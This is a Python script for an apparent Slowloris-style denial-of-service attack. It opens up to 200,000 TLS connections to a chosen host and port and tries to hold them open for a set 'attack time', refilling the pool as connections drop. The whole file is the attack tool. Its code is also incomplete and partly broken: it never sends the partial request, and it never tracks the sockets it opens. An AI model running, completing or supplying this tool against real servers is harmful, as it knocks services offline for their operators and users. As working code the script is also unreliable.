import socket
import time
import random
import logging
import ssl
import select
import argparse
import sys

parser = argparse.ArgumentParser(description="Your tool’s description")
parser.add_argument(
    "--host", "-H",
    default="localhost",
    help="Target hostname or IP"
)
parser.add_argument(
    "--port", "-p",
    type=int,
    default=443,
    help="Target port (default: 443)"
)
parser.add_argument(
    "--sockets", "-s",
    type=int,
    default=200000,
    help="Number of parallel sockets to open"
)

parser.add_argument(
                    "--attackTime",default=1000,
                    type=int, 
                    help="Time in seconds to keep the attack running")

args = parser.parse_args()


# --- new ---
ssl_ctx = ssl.create_default_context()
# If you don’t care about cert verification in your lab:
# ssl_ctx.check_hostname = False
# ssl_ctx.verify_mode    = ssl.CERT_NONE







sockets = []

import socket, selectors, threading, time, random, queue

HOST, PORT        = args.host, args.port
SOCKET_COUNT      = args.sockets
ATTACK_TIME       = args.attackTime
#---checking if address is valid---

def validate_address(host: str, port: int, timeout: float = 5.0):
    """
    1) Checks DNS resolution of host.
    2) Tries a single TCP connect to host:port.
    Exits with an error message if either step fails.
    """
    try:
        addrs = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
    except socket.gaierror as e:
        print(f"[!] Hostname lookup failed for {host!r}: {e}")
        sys.exit(1)

    for family, socktype, proto, _, sockaddr in addrs:
        try:
            s = socket.socket(family, socktype, proto)
            s.settimeout(timeout)
            s.connect(sockaddr)
            s.close()
            print(f"[+] Successfully connected to {host}:{port}")
            return  # success!
        except Exception:
            continue

    print(f"[!] Unable to connect to {host}:{port} within {timeout}s.")
    sys.exit(1)
#-------------######-----------------

sel      = selectors.DefaultSelector()   # uses epoll/kqueue/Select automatically
sockets  = {}        # fileno ➜ socket object
todo_q   = queue.Queue()  # commands for watcher ➜ main (optional)
i=0
def create_socket(_=None):                    # underscore arg matches ThreadPool API
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(ATTACK_TIME)
    raw.connect((HOST, PORT))
    raw.setblocking(False)

    # wrap, but don’t do handshake yet
    ss = ssl_ctx.wrap_socket(raw,
                             server_hostname=HOST,
                             do_handshake_on_connect=False)

    # now do the handshake with a longer window
    deadline = time.time() + ATTACK_TIME  # e.g. 30 s total
    while True:
        try:
            ss.do_handshake()
            break
        except ssl.SSLWantReadError:
            # socket not quite ready → wait until readable or timeout
            if time.time() > deadline:
                raise TimeoutError("TLS handshake timed out")
            select.select([ss], [], [], 1)
    
    ss.setblocking(False)
    # send your partial GET…
    return ss

import concurrent.futures

MAX_WORKERS   = 100        # or args.workers

def replenish_sockets():
    """Bring the global pool back up to TARGET_COUNT using a threadpool."""
    deficit = SOCKET_COUNT - len(sockets)
    if deficit <= 0:
        return
    logging.info("Need %d new sockets → spinning up pool…", deficit)

    # Use threads so all TCP handshakes run concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        for sock in pool.map(create_socket, range(deficit)):
            if not sock:
                # Optional: queue a retry later if many fail
                continue


def watcher():
    """Blocks until a socket is readable/HUP → recreate it instantly."""
    while True:
        events = sel.select()            # BLOCKS until something happens
        for key, mask in events:
            fd = key.fd
            sock = sockets.pop(fd, None)
            if sock:
                sel.unregister(sock)
                sock.close()
        replenish_sockets()  # Replenish sockets after handling events


# --- Bootstrap ----------------------------------------------------------
i=0

validate_address(HOST, PORT)  # Check if the address is valid

replenish_sockets()  # Fill the pool to start
watcher()





        
                
